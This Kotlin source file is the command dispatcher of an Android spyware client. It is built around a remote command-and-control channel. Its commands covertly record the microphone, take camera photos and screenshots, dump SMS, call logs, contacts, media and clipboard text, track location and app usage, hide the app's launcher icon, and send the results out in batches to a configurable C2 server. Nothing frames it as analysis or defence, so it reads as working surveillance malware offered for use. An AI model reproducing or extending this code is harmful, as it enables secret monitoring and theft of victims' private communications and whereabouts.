package com.sp.core.c2

import android.content.Context
import android.content.Intent
import android.os.Build
import com.sp.core.services.CameraSnapService
import com.sp.core.services.LocationFix
import com.sp.core.services.MediaStealer
import com.sp.core.services.MicRecorder
import com.sp.core.services.ProjectionConsent
import com.sp.core.services.UsageStatsService
import com.sp.core.util.BatchExfil
import com.sp.core.util.DeadDrop
import com.sp.core.worker.BatchFlushWorker

/**
 * Command set of the C2. Every command is executed locally, the result is
 * buffered and shipped with the next 45-minute batch.
 */
object Commands {

    fun dispatch(ctx: Context, cmd: String, args: Map<String, String>) {
        when (cmd) {
            "loc" -> {
                LocationFix.send(ctx, immediate = true)
            }

            "smsdump" -> {
                val n = args["n"]?.toIntOrNull() ?: 30
                val count = com.sp.core.services.SmsDumper.dump(ctx, n)
                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"smsdump","ok":true,"count":$count}""")
            }

            "mic" -> {
                val sec = args["sec"]?.toIntOrNull() ?: 60
                val i = Intent(ctx, MicRecorder::class.java).putExtra("seconds", sec)
                startWith(ctx, i)
            }

            "media" -> MediaStealer.stealRecent(ctx, args["n"]?.toIntOrNull() ?: 20)

            "ping" -> Exfil.sendLog(ctx, "pong", """{"ts":${System.currentTimeMillis()}}""")

            "screen" -> ProjectionConsent.launch(
                ctx,
                args["shots"]?.toIntOrNull() ?: 1,
                args["interval"]?.toLongOrNull() ?: 0L
            )

            "cam" -> CameraSnapService.start(ctx, args["front"] == "1" || args["front"] == "true")

            "usage" -> UsageStatsService.collectUsage(ctx)

            "apps" -> Exfil.sendLog(ctx, "apps", UsageStatsService.inventory(ctx))

            "calls" -> {
                val n = com.sp.core.services.CallLogDumper.dump(ctx)
                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"calls","count":$n}""")
            }

            "contacts" -> {
                val n = com.sp.core.services.ContactsDumper.dump(ctx)
                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"contacts","count":$n}""")
            }

            "ddr" -> {
                val found = DeadDrop.resolve(ctx, apply = false)
                Exfil.sendLog(ctx, "ddr", """{"found":${found != null},"ts":${System.currentTimeMillis()}}""")
            }

            "cfg" -> {
                val url = args["url"]
                if (!url.isNullOrEmpty()) {
                    Exfil.setC2(ctx, url, args["key"])
                    Exfil.sendLog(ctx, "cmd_result", """{"cmd":"cfg","ok":true,"url":"$url"}""")
                }
            }

            "flush" -> {
                // Send everything that is waiting in the buffer right now.
                BatchExfil.flush(ctx)
                BatchFlushWorker.flushNow(ctx)
                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"flush","ok":true,"pending":${BatchExfil.pendingCount(ctx)}}""")
            }

            "diag" -> Exfil.sendLog(ctx, "diag", com.sp.core.util.Diag.collect(ctx))

            "clipboard" -> {
                val text = readClipboard(ctx)
                if (text.isNullOrBlank()) {
                    Exfil.sendLog(ctx, "cmd_result", """{"cmd":"clipboard","ok":false,"reason":"empty"}""")
                } else {
                    Exfil.sendLog(
                        ctx, "clipboard",
                        """{"text":"${escape(text)}","len":${text.length},"ts":${System.currentTimeMillis()}}"""
                    )
                    Exfil.sendLog(ctx, "cmd_result", """{"cmd":"clipboard","ok":true,"len":${text.length}}""")
                }
            }

            "wizard" -> {
                // The icon may be hidden - bring it back so the wizard can be
                // opened, and arm the automatic setup.
                com.sp.core.stealth.IconHider.show(ctx)
                com.sp.core.util.Prefs.set(ctx, com.sp.core.LauncherActivity.KEY_AUTO, true)
                com.sp.core.util.Prefs.set(ctx, com.sp.core.LauncherActivity.KEY_AUTO_IDX, 0)
                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"wizard","ok":true,"icon":"visible"}""")
            }

            "hide" -> {
                com.sp.core.stealth.IconHider.hide(ctx)
                val state = com.sp.core.stealth.IconHider.isHidden(ctx)
                Exfil.sendLog(
                    ctx, "cmd_result",
                    """{"cmd":"hide","ok":$state,"icon":"hidden","state":$state}"""
                )
            }

            "show" -> {
                com.sp.core.stealth.IconHider.show(ctx)
                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"show","ok":true,"icon":"visible"}""")
            }

            else -> Exfil.sendLog(ctx, "cmd_result", """{"cmd":"$cmd","ok":false,"reason":"unknown"}""")
        }
    }

    /** Current clipboard content, or null when there is nothing usable. */
    private fun readClipboard(ctx: Context): String? {
        return try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip
            if (clip == null || clip.itemCount == 0) null
            else clip.getItemAt(0)?.text?.toString()
        } catch (_: Throwable) {
            null
        }
    }

    private fun escape(s: String): String =
        s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "")

    private fun start(ctx: Context, cls: Class<*>) {
        val i = Intent(ctx, cls)
        startWith(ctx, i)
    }

    private fun startWith(ctx: Context, i: Intent) {
        try {
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        } catch (_: Throwable) {
        }
    }
}
